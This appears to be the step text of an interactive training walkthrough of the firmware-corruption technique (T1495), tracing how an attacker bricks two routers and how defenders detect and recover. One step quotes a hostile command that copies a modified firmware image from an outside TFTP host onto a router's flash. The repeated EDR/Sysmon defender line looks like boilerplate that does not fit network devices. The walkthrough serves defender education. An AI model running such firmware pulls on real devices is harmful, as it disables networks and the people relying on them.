title: T1495 — Firmware Corruption
subtitle: Interactive walkthrough of Firmware Corruption with the technique-specific attack path and defender evidence.

steps.title: Pivot into the management VLAN
steps.caption: The attacker already holds stolen admin credentials. From a host inside the IT LAN they reach the management VLAN - a separate network used only to manage devices. No device changes yet, so nothing breaks. The only early clue is a firewall or VPN log showing an unusual source network touching management addresses
steps.defender: EDR and Sysmon record the process, memory and image-load events. Correlate them with the parent process.

steps.title: Login to the router admin console
steps.caption: The attacker opens an SSH session to Router A, the edge router at headquarters. The AAA server (authentication, authorization, accounting - the system that checks logins and records every command) records a privileged shell session. Evidence: AAA log with user, source IP, privilege level 15, and a task ID
steps.defender: EDR and Sysmon record the process, memory and image-load events. Correlate them with the parent process.

steps.caption: The attacker pulls a modified firmware image from an outside host onto the device. Evidence: TACACS+ command accounting shows copy tftp://203.0.113.77/fw.bin flash: , and the device log shows a new file in flash memory that is not on the approved-image list

steps.title: Flash write, integrity check fails
steps.caption: The device writes the image into flash memory. The digital signature check fails - but the warning goes only to the local console, and the session continues. Evidence: device syslog line about image verification failure, if syslog is forwarded off the box at all

steps.title: Router A goes dark
steps.caption: Router A reboots into the broken image and never starts. Its uplink stops passing traffic. Evidence: a sudden syslog silence, then a network management system (NMS) alarm: edge-rtr-01 DOWN . The last AAA session and the outage are minutes apart
steps.defender: EDR and Sysmon record the process, memory and image-load events. Correlate them with the parent process.

steps.title: Same attack on Router B; the branch goes dark
steps.caption: The attacker repeats the flash against Router B at the branch office. Phones, tills, and laptops there lose connectivity. Evidence: a second down-alarm at another site, and a matching management-plane login from the same source IP

steps.title: The SOC connects the dots
steps.caption: Alone, each alarm looks like a line fault. Together - a burst of device-offline events, firmware-change audit records outside any change window, and silent subnets - the pattern says firmware corruption, not an ISP problem. Evidence: NMS down-burst report plus AAA audit trail plus firmware audit events
steps.defender: EDR and Sysmon record the process, memory and image-load events. Correlate them with the parent process.

steps.title: Response and recovery
steps.caption: Responders block the management plane, swap or reflash both routers with a last-known-good image, and restore configurations from off-device backups. Then they rotate device credentials and hunt for the same access pattern elsewhere. Evidence: change records, restored-image hash checks, and bricked units kept as forensic evidence
